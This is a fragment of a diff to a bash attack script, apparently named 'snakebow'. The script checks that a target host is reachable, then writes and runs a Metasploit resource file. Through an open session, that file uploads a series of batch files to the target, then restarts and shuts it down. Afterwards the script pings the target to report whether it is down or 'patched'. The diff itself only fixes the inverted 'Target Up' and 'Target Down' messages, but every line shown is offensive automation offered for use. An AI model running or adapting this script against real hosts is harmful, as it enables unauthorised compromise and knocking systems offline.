@@ -51,12 +51,12 @@ if [ $( ping -c 1 $tip | grep "1 received" | wc -c ) -eq "60" ]; then
          echo -e "sessions -i 1 -C upload core.bat" >> snakebow.rc
          echo -e "sessions -i 1 -C cd ..\nsessions -i 1 -C upload cmd1.bat\nsessions -i 1 -C upload cmd2.bat\nsessions -i 1 -C upload cmd3.bat\nsessions -i 1 -C upload cmd4.bat\nsessions -i 1 -C upload cmd5.bat\nsessions -i 1 -C upload cmd6.bat\nsessions -i 1 -C upload cmd7.bat\nsessions -i 1 -C upload cmd8.bat\nsessions -i 1 -C upload cmd9.bat\nrestart\nshutdown\nsessions -k 1\nexit -y" >> snakebow.rc
          msfconsole -r snakebow.rc
-         echo -e "\n Please Wait , Monitoring Target Behaviour"
+         echo -e "\n Monitoring Target Behaviour , Please Wait!"
          sleep 11
          if [ $( ping -c 1 $tip | grep "1 received" | wc -c ) -eq "60" ]; then
-            echo -e "\n\e[34m Attack Completed < Target Down > \e[0m"
+            echo -e "\n\e[34m Attack Completed , Target Up \e[0m"
          else
-            echo -e "\n\e[34m Attack Completed , Target Up !\e[0m"
+            echo -e "\n\e[34m Attack Completed , < Target Down > !\e[0m"
          fi
       else
          echo -e "\nSorry The Target is Patched !"
